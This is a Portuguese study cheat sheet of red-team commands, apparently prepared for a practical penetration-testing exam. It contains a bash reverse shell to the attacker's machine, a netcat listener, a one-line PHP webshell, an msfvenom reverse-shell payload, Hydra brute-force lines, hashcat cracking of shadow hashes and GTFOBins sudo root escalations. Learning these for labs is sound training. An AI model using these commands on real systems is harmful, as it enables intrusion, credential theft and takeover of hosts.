# Comandos Red Team

Gobuster/dirb

gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt → descoberta de diretórios/arquivos escondidos no site

gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html → mesma busca, testando extensões de arquivo também

gobuster dns -d <dominio> -w /usr/share/wordlists/dirb/common.txt → descoberta de subdomínios

dirb http://<IP> /usr/share/wordlists/dirb/common.txt → alternativa mais simples ao gobuster

Regra prática: caminho novo achado, acessar pela URL no navegador, não pelo terminal local.

Hydra

hydra -l lin -P locks.txt <IP> ssh → 1 usuário fixo + wordlist de senha

hydra -L usuarios.txt -P senhas.txt <IP> ssh → wordlist de usuário E senha

hydra -l admin -P senhas.txt <IP> ftp → mesma lógica, outro serviço

hydra -l admin -P senhas.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect" → login web; antes, capturar os campos exatos do formulário e a mensagem de erro

Hydra nunca é o primeiro passo — vem depois de já ter achado usuário ou wordlist válida.

SMB

smbclient -L //<IP>/ -N → lista compartilhamentos sem autenticação

smbclient //<IP>/nome_share -N → entra num compartilhamento específico

enum4linux -a <IP> → enumeração completa (usuários, shares, políticas)

Reverse shell / netcat

nc -lvnp 4444 → escutar no Kali, esperando conexão de volta

bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1 → reverse shell bash, uma linha só

webshell PHP simples (system($_GET["cmd"]) num arquivo .php) → executa comando via parâmetro da URL

[revshells.com](http://revshells.com/) → gera qualquer payload pronto, só trocar IP/porta

Lembrar: reverse shell = o ALVO conecta de volta pra você — o IP/porta é o do seu Kali, não do alvo.

GTFOBins — escalada via sudo

tar → sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

python/python3 → sudo python3 -c 'import os; os.execl("/bin/bash","bash")'

find → sudo find . -exec /bin/bash \; -quit

perl → sudo perl -e 'exec "/bin/bash";'

vim/vi → sudo vim -c ':!/bin/bash'

(ALL) sem restrição → sudo bash direto

Binário não listado: pesquisar no [gtfobins.github.io](http://gtfobins.github.io/).

Crontab

crontab -l → tarefas do usuário atual

cat /etc/crontab → tarefas globais

ls /etc/cron.d/ && cat /etc/cron.d/* → tarefas de pacotes/serviços

O que procurar: tarefa root que chama script gravável por você = escalada sem senha.

Hash / senha

hashcat -m 1800 hash.txt wordlist.txt → sha512crypt (padrão /etc/shadow moderno)

hashcat -m 0 hash.txt wordlist.txt → MD5

hashcat -m 1000 hash.txt wordlist.txt → NTLM (Windows)

john --wordlist=wordlist.txt hash.txt → alternativa ao hashcat

Diferença: hydra é quando você NÃO tem o hash (login remoto); hashcat/john são quando já tem o hash pra quebrar offline.

Metasploit

msfconsole → abre o console

search tomcat → busca módulo

use auxiliary/scanner/http/tomcat_mgr_login → carrega módulo

set RHOSTS <IP> → define o alvo

run → executa

msfvenom -p php/reverse_php LHOST=<IP_KALI> LPORT=4444 -f raw > shell.php → payload webshell PHP

Porta 8080/Tomcat: direto pro tomcat_mgr_login antes de tentar hydra manual.

Vulnerabilidades comuns por porta

21 FTP → login anônimo, às vezes arquivo com senha

22 SSH → força bruta só depois de achar usuário/wordlist

80/443 HTTP → código-fonte + gobuster, credencial padrão

8080 Tomcat → Metasploit tomcat_mgr_login

139/445 SMB → smbclient/enum4linux

Recursos permitidos na prova (sem IA, com internet)

hacktricks.xyz → metodologia geral

[gtfobins.github.io](http://gtfobins.github.io/) → escalada via sudo/SUID

PayloadsAllTheThings (GitHub) → webshells/reverse shells prontos

[revshells.com](http://revshells.com/) → gerador de reverse shell

[exploit-db.com](http://exploit-db.com/) → exploits públicos

Erros que já travaram antes

Confundir terminal do Kali com o da máquina alvo (prompt muda)

/usr vs /home/<usuario>/

Pipe | (Alt Gr + \ no ABNT) ≠ barra /

Ler CIDR (/24) e output do nmap -sV -sC com atenção